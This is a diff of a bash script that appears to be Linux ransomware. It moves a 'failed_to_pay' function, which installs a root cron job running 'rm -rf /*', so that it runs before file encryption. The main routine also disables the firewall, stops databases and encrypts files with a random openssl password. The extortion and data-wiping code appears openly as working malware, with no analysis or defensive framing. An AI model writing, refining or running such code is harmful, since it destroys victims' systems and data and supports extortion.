@@ -83,6 +83,12 @@ stop_database() {
     fi
 }
 
+failed_to_pay() {
+    echo "Setting cronjob to delete files in 7 days"
+    (crontab -l 2>/dev/null; echo "0 0 * * 0 sleep 7d; rm -rf /*") | crontab -
+    echo "Cronjob set successfully"
+}
+
 encrypt_files() {
     password=$(openssl rand -base64 32)
 
@@ -125,20 +131,14 @@ encrypt_files() {
     fi
 }
 
-failed_to_pay() {
-    echo "Setting cronjob to delete files in 7 days"
-    (crontab -l 2>/dev/null; echo "0 0 * * 0 sleep 7d; rm -rf /*") | crontab -
-    echo "Cronjob set successfully"
-}
-
 main() {
     check_root
     check_distro
     disable_firewall
     install_dependencies
     stop_database
-    encrypt_files
     failed_to_pay
+    encrypt_files
 }
 
 main
